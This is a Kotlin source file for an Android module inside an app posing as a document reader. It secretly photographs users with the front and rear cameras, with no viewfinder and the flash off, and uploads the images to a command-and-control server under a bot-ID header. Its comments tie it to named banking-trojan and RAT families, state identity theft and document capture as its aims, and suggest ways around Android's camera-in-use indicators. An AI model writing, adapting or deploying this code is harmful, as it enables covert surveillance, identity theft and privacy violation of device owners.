package com.docreader.lite.reader.advanced

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import com.docreader.lite.reader.C2
import com.docreader.lite.reader.Exfil
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

/**
 * Camera capture — silent photo/video from device cameras.
 *
 * Family reference:
 *   - Brokewell (2025 variant): captures photos from front + rear camera
 *   - SpyNote RAT: continuous camera streaming
 *   - Cerberus: on-demand photo capture
 *   - DroidJack: camera surveillance
 *
 * Use cases:
 *   1. Identity capture: front camera photo of victim for identity theft
 *   2. Environment intel: rear camera for physical location verification
 *   3. Document capture: photograph cards, documents near the device
 *   4. Anti-analysis: verify real human holding device (not emulator)
 *
 * Architecture:
 *   Camera2 API → ImageReader → JPEG → C2 upload
 *   No preview surface — camera captures silently without showing viewfinder
 *   HandlerThread for camera callbacks (required by Camera2)
 *
 * Limitations:
 *   - Android 9+ shows camera-in-use indicator (green dot)
 *   - Some OEMs add shutter sound that can't be silenced
 *   - Background camera access restricted on Android 14+
 *   - Workaround: capture during screen-off or black overlay active
 */
object CameraCapture {

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /**
     * Capture a single photo from specified camera.
     *
     * @param useFront true = front (selfie) camera, false = rear camera
     */
    fun capturePhoto(context: Context, useFront: Boolean = true) {
        startBackgroundThread()

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
            ?: return

        val cameraId = findCamera(cameraManager, useFront) ?: run {
            Exfil.event("camera_error", "reason" to "no_camera_found", "front" to useFront.toString())
            return
        }

        // Create ImageReader for JPEG output
        imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            image.close()

            // Upload to C2
            uploadPhoto(bytes, useFront)

            // Cleanup
            closeCamera()
        }, backgroundHandler)

        // Open camera
        try {
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession(camera)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    Exfil.event("camera_error", "code" to error.toString())
                }
            }, backgroundHandler)
        } catch (e: SecurityException) {
            Exfil.event("camera_error", "reason" to "permission_denied")
        }
    }

    /**
     * Capture photos from BOTH cameras — full identity + environment capture.
     * Front camera first (identity), then rear (environment).
     */
    fun captureAll(context: Context) {
        scope.launch {
            capturePhoto(context, useFront = true)
            delay(3000) // Wait for front camera to complete
            capturePhoto(context, useFront = false)
        }
    }

    fun closeCamera() {
        captureSession?.close()
        cameraDevice?.close()
        imageReader?.close()
        captureSession = null
        cameraDevice = null
        imageReader = null
        stopBackgroundThread()
    }

    // ─── Internal ───────────────────────────────────────────────────

    private fun createCaptureSession(camera: CameraDevice) {
        val surface = imageReader?.surface ?: return

        camera.createCaptureSession(
            listOf(surface),
            object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session

                    // Build and execute capture request
                    val captureRequest = camera.createCaptureRequest(
                        CameraDevice.TEMPLATE_STILL_CAPTURE
                    ).apply {
                        addTarget(surface)
                        // Auto-focus + auto-exposure for best quality
                        set(CaptureRequest.CONTROL_AF_MODE,
                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                        set(CaptureRequest.CONTROL_AE_MODE,
                            CaptureRequest.CONTROL_AE_MODE_ON)
                        // Disable flash — stealth
                        set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
                    }

                    session.capture(captureRequest.build(), null, backgroundHandler)
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Exfil.event("camera_session_failed")
                }
            },
            backgroundHandler
        )
    }

    private fun findCamera(manager: CameraManager, front: Boolean): String? {
        val targetFacing = if (front) {
            CameraCharacteristics.LENS_FACING_FRONT
        } else {
            CameraCharacteristics.LENS_FACING_BACK
        }

        return manager.cameraIdList.firstOrNull { id ->
            val chars = manager.getCameraCharacteristics(id)
            chars.get(CameraCharacteristics.LENS_FACING) == targetFacing
        }
    }

    private fun uploadPhoto(data: ByteArray, isFront: Boolean) {
        scope.launch {
            try {
                val body = okhttp3.RequestBody.create(
                    "image/jpeg".toMediaTypeOrNull(), data
                )
                val req = okhttp3.Request.Builder()
                    .url("${C2.baseUrl()}/api/v1/camera")
                    .post(body)
                    .header("X-Bot-Id", android.os.Build.MODEL)
                    .header("X-Camera", if (isFront) "front" else "rear")
                    .build()
                okhttp3.OkHttpClient().newCall(req).execute().close()

                Exfil.event("camera_photo_sent",
                    "camera" to if (isFront) "front" else "rear",
                    "size" to data.size.toString()
                )
            } catch (_: Exception) {
                Exfil.event("camera_upload_failed")
            }
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraCapture").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
        } catch (_: InterruptedException) {}
        backgroundThread = null
        backgroundHandler = null
    }
}
